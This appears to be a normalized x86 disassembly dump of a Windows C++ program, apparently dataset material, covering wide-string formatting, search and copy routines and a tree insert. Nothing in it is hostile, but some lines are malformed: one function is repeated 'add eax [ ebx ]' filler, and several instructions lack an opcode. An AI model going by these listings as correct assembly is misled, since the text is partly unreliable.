sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_448d81
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push ecx
push eax
push r--data
mov [ ebp - 0x10 ] 0x1
call sub_401dc0
add esp 0xc
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0xc
sub_401090
push ebp
mov ebp esp
push 0xffffffff
push sub_44a120
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ edi - 0x8 ]
mov ecx 0x1
sub ecx [ edi - 0x4 ]
sub eax 0x40
or eax ecx
jge r-xdata
push edi
call sub_402da0
mov eax [ edi - 0x8 ]
mov ebx [ wcsnlen@IAT ]
push eax
push edi
call ebx
add esp 0x8
test eax eax
js r-xdata
mov eax 0x40
lea ecx [ ebp - 0x1c ]
call sub_402c40
mov edi [ ebp - 0x1c ]
push 0x80070057
call sub_402d00
cmp eax [ edi - 0x8 ]
jg r-xdata
mov [ edi - 0xc ] eax
xor ecx ecx
mov [ edi + eax * 2 ] cx
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
lea edi [ eax + 0x10 ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x3
mov eax [ edi - 0x8 ]
mov ecx 0x1
sub ecx [ edi - 0x4 ]
add eax 0xffffff80
or eax ecx
jge r-xdata
mov esi [ Ordinal_crt_35@IAT ]
push 0x0
push 0x80
push edi
push r--data
push r--data
call esi
add esp 0x14
test al al
jne r-xdata
mov eax 0x80
lea ecx [ ebp - 0x18 ]
call sub_402c40
mov edi [ ebp - 0x18 ]
mov eax [ edi - 0x8 ]
push eax
push edi
call ebx
add esp 0x8
test eax eax
js r-xdata
call sub_403310
test eax eax
je r-xdata
cmp eax [ edi - 0x8 ]
jg r-xdata
push 0x0
push 0x80
push edi
push r--data
push r--data
call esi
add esp 0x14
mov [ edi - 0xc ] eax
xor ecx ecx
mov [ edi + eax * 2 ] cx
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
lea edi [ eax + 0x10 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x5
mov eax [ edi - 0x8 ]
mov ecx 0x1
sub ecx [ edi - 0x4 ]
sub eax 0x104
or eax ecx
jge r-xdata
push 0x0
push 0x104
push edi
push r--data
push r--data
call esi
mov eax [ edi - 0x8 ]
push eax
push edi
call ebx
add esp 0x1c
test eax eax
js r-xdata
mov eax 0x104
lea ecx [ ebp - 0x14 ]
call sub_402c40
mov edi [ ebp - 0x14 ]
cmp eax [ edi - 0x8 ]
jg r-xdata
mov [ edi - 0xc ] eax
xor ecx ecx
mov [ edi + eax * 2 ] cx
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edi [ eax ]
cmp edi eax
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
lea ebx [ eax + 0x10 ]
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
mov ecx [ ebx - 0x8 ]
mov eax 0x1
sub eax [ ebx - 0x4 ]
sub ecx 0x104
or eax ecx
jge r-xdata
lea eax [ edi + 0xc ]
lea edx [ eax + 0x4 ]
push edx
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_401000
mov [ ebp - 0x4 ] 0x8
mov eax [ eax ]
mov ecx [ eax - 0xc ]
push ecx
push eax
lea ebx [ ebp - 0x10 ]
call sub_402ab0
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x24 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push 0x0
push 0x104
push ebx
push r--data
push r--data
call esi
mov eax [ ebx - 0x8 ]
push eax
push ebx
call [ wcsnlen@IAT ]
add esp 0x1c
test eax eax
js r-xdata
mov eax 0x104
lea ecx [ ebp + 0x8 ]
call sub_402c40
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
cmp eax [ ebx - 0x8 ]
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax [ edi + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebx - 0xc ] eax
xor ecx ecx
mov [ ebx + eax * 2 ] cx
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xd
push ebx
push r--data
lea edi [ ebp - 0x20 ]
call sub_401dc0
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
add esp 0x8
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0xf
mov esi [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
push esi
push ecx
mov ecx [ ebp - 0x14 ]
push edx
push eax
push ecx
push r--data
push r--data
lea edi [ ebp - 0x24 ]
call sub_401dc0
mov edi [ ebp - 0x24 ]
push edi
push r--data
push 0x0
push 0x0
call [ Ordinal_crt_119@IAT ]
mov edx [ ebp + 0xc ]
push edx
push edi
call [ Ordinal_crt_136@IAT ]
add esp 0x34
test al al
je r-xdata
push 0x1
push r--data
lea ebx [ ebp - 0x10 ]
call sub_402ab0
mov edx [ ebp + 0x8 ]
cmp edi [ edx + 0x4 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov edi eax
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xd
add edi 0xfffffff0
lea ecx [ edi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xd
add edi 0xfffffff0
lea eax [ edi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov edi eax
lea esp [ esp ]
mov edi eax
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xb
add esi 0xfffffff0
lea eax [ esi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ edi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
call edx
mov [ ebp - 0x4 ] 0xb
add esi 0xfffffff0
lea ecx [ esi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ edi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push edi
call eax
mov edi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
add ebx 0xfffffff0
lea ecx [ ebx + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
mov [ ebp - 0x4 ] 0x7
add ebx 0xfffffff0
lea eax [ ebx + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebx ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push ebx
call edx
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebx ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ebx
call eax
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x18 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x18 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax 0x80004005
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_401640
push ebp
mov ebp esp
push 0xffffffff
push sub_44548d
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4016d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4454d3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_401760
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push esi
mov esi [ edi ]
lea eax [ ecx - 0x10 ]
sub esi 0x10
cmp eax esi
je r-xdata
mov eax edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0xc ] 0x0
push ebx
lea ebx [ esi + 0xc ]
jl r-xdata
mov ebx [ ecx - 0xc ]
push ecx
push edi
call sub_402910
pop ebx
mov edx [ eax ]
cmp edx [ esi ]
jne r-xdata
call sub_4025f0
mov [ ebp - 0x4 ] eax
or eax 0xffffffff
[ ebx ] eax
dec eax
test eax eax
jg r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x10
pop ebx
mov [ edi ] ecx
mov eax edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
sub_4017d0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x18
push ebx
xor ebx ebx
push esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
lea edx [ eax + 0x2 ]
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push edi
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
test esi esi
je r-xdata
lea esi [ eax + 0x12 ]
push r--data
push esi
inc ebx
call edi
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax ]
mov ecx [ esi - 0xc ]
lea eax [ esi + ecx * 2 ]
mov [ ebp - 0xc ] eax
cmp esi eax
jae r-xdata
xor eax eax
mov eax esi
lea edx [ eax + 0x2 ]
mov edi [ wcsstr@IAT ]
push r--data
push esi
call edi
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xc ] ebx
test ebx ebx
jle r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
jmp r-xdata
pop edi
mov esi [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov edi [ edx - 0xc ]
add esi 0xfffffff7
imul esi ebx
add esi edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x18 ] esi
mov eax esi
cmp esi edi
jg r-xdata
lea esi [ esi + eax * 2 + 0x2 ]
cmp esi [ ebp - 0xc ]
jb r-xdata
test eax eax
jns r-xdata
mov eax edi
mov ebx 0x1
sub ebx [ edx - 0x4 ]
mov edx [ edx - 0x8 ]
sub edx eax
or ebx edx
jge r-xdata
push 0x80070057
call sub_402d00
mov ebx [ ecx ]
lea eax [ ebx + edi * 2 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] eax
cmp ebx eax
jae r-xdata
call sub_402c40
mov ecx [ ebp + 0x8 ]
test esi esi
js r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
cmp esi [ eax - 0x8 ]
jg r-xdata
push r--data
push ebx
call [ wcsstr@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ebx [ ebp - 0xc ]
mov [ eax - 0xc ] esi
mov edx [ ecx ]
xor eax eax
mov [ edx + esi * 2 ] ax
test ebx ebx
je r-xdata
lea esp [ esp ]
xor eax eax
mov eax ebx
lea edx [ eax + 0x2 ]
nop
push 0x80004005
call sub_402d00
movzx edx [ eax + lookup_table_401a08 ]
jmp [ edx * 4 + jump_table_4019f8 ]
mov esi [ ebp - 0x18 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
add eax eax
push eax
push ecx
push eax
push esi
call [ memcpy_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
push 0x8007000e
call sub_402d00
lea ebx [ ebx + eax * 2 + 0x2 ]
cmp ebx [ ebp - 0x14 ]
jb r-xdata
movzx edx [ eax + lookup_table_401a6c ]
jmp [ edx * 4 + jump_table_401a5c ]
mov eax [ ebp - 0x4 ]
add edi eax
xor ecx ecx
add eax 0xfffffff7
add [ ebp - 0x8 ] eax
push r--data
push ebx
mov [ esi + edi * 2 ] cx
call [ wcsstr@IAT ]
mov edi [ ebp - 0x8 ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax esi
sub eax [ ebp - 0x10 ]
lea ecx [ esi + 0x12 ]
sar eax 0x1
sub edi eax
sub edi 0x9
lea eax [ edi + edi ]
push eax
push ecx
add ebx ebx
push eax
add ebx esi
push ebx
call [ memmove_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
sub_401a70
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_401ac0
mov eax [ edi ]
push esi
mov esi [ eax - 0xc ]
test esi esi
jns r-xdata
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx esi
or ecx edx
jge r-xdata
push 0x80070057
call sub_402d00
mov ecx [ edi ]
lea eax [ esi + 0x1 ]
push eax
push ecx
call [ _wcslwr_s@IAT ]
mov eax [ edi ]
add esp 0x8
cmp esi [ eax - 0x8 ]
jg r-xdata
mov eax esi
mov ecx edi
call sub_402c40
mov [ eax - 0xc ] esi
mov edx [ edi ]
xor eax eax
mov [ edx + esi * 2 ] ax
mov eax edi
pop esi
retn
sub_401b20
push ebp
mov ebp esp
push 0xffffffff
push sub_448d81
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x0
mov ecx [ eax ]
mov ecx [ ecx - 0x10 ]
test ecx ecx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
mov ecx rw-data
call eax
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
add eax 0x10
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
test ebx ebx
jne r-xdata
push 0x80004005
call sub_402d00
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
xor edx edx
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov edx eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
mov eax [ ecx - 0xc ]
push edx
push ebx
push ecx
push esi
call sub_401ce0
add esp 0x10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_401c00
push ebp
mov ebp esp
push 0xffffffff
push sub_448d41
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov eax [ esi ]
mov ecx [ eax - 0x10 ]
test ecx ecx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
mov ecx rw-data
call eax
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x0
mov edx [ esi ]
mov esi [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x1
test esi esi
jne r-xdata
push 0x80004005
call sub_402d00
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
mov eax esi
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x14 ] ecx
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp - 0x14 ]
sar eax 0x1
mov ecx [ edx - 0xc ]
push ecx
push edx
push esi
push ebx
call sub_401ce0
add esp 0x10
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_401ce0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
lea edi [ esi + eax ]
test edi edi
jns r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx edi
or ecx edx
jge r-xdata
push 0x80070057
call sub_402d00
mov eax [ ebp + 0xc ]
mov ebx [ ebx ]
add esi esi
push esi
push eax
push esi
push ebx
call [ memcpy_s@IAT ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
add eax eax
push eax
push ecx
push eax
add esi ebx
push esi
call [ memcpy_s@IAT ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
add esp 0x20
cmp edi [ eax - 0x8 ]
jg r-xdata
mov eax edi
mov ecx ebx
call sub_402c40
mov [ eax - 0xc ] edi
mov edx [ ecx ]
xor eax eax
mov [ edx + edi * 2 ] ax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_401d60
push ebp
mov ebp esp
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push 0x80004005
call sub_402d00
sbb eax eax
sbb eax 0xffffffff
test eax eax
sets al
pop ebp
retn 0x4
test dx dx
je r-xdata
xor eax eax
test eax eax
sets al
pop ebp
retn 0x4
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_401de0
push ebp
mov ebp esp
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
push esi
push eax
push ebx
call [ _vscwprintf@IAT ]
mov esi eax
add esp 0x8
test esi esi
jns r-xdata
push 0x80070057
call sub_402d00
mov eax [ edi ]
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx esi
or ecx edx
jge r-xdata
push 0x80004005
call sub_402d00
mov eax [ ebp + 0x8 ]
mov edx [ edi ]
push eax
push ebx
lea ecx [ esi + 0x1 ]
push ecx
push edx
call [ vswprintf_s@IAT ]
mov eax [ edi ]
add esp 0x10
cmp esi [ eax - 0x8 ]
jg r-xdata
mov eax esi
mov ecx edi
call sub_402c40
mov [ eax - 0xc ] esi
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
pop esi
pop ebp
retn 0x4
sub_401e60
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push ebx
push esi
mov esi [ eax + 0x4 ]
cmp [ esi + 0x15 ] 0x0
mov ebx eax
mov al 0x1
mov [ ebp - 0x8 ] al
jne r-xdata
mov esi ebx
mov [ ebp - 0x4 ] esi
test al al
je r-xdata
mov edi edi
mov eax [ ebp + 0xc ]
lea edx [ esi + 0xc ]
push edx
add eax 0xc
call sub_401d60
test al al
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ edx + 0x4 ]
cmp ebx [ eax ]
jne r-xdata
push 0x80004005
call sub_402d00
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
add eax 0xc
push eax
call sub_4022e0
mov ecx [ ebp + 0xc ]
push ecx
call [ operator delete@IAT ]
add esp 0x8
mov [ edi ] esi
pop esi
mov [ edi + 0x4 ] 0x0
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
lea edx [ ebp + 0xc ]
push edx
mov ecx ebx
call sub_401f90
mov eax [ eax ]
pop esi
mov [ edi ] eax
mov [ edi + 0x4 ] 0x1
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_42a5d0
mov esi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx ebx
mov eax edx
call sub_401f90
mov ecx [ eax ]
pop esi
mov [ edi ] ecx
mov [ edi + 0x4 ] 0x1
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ecx [ esi + 0xc ]
mov ebx esi
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ esi + 0x15 ] 0x0
je r-xdata
test eax eax
sets al
mov [ ebp - 0x8 ] al
test al al
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_401f90
push ebp
mov ebp esp
mov edx [ eax + 0x8 ]
push ebx
push esi
push edi
cmp edx 0x1ffffffe
jb r-xdata
mov edi [ ebp + 0x10 ]
inc edx
mov [ eax + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
xor bl bl
cmp ecx edx
jne r-xdata
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0xc ]
push eax
call sub_4022e0
push esi
call [ operator delete@IAT ]
add esp 0x8
push r--data
call [ std::_Xlength_error@IAT ]
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ eax + 0x4 ]
mov [ ecx ] edi
mov edx [ eax + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ eax + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ eax + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] bl
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
pop esi
mov [ ecx + 0x14 ] 0x1
pop ebx
pop ebp
retn 0xc
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
mov esi [ esi ]
cmp [ esi + 0x14 ] bl
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] bl
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
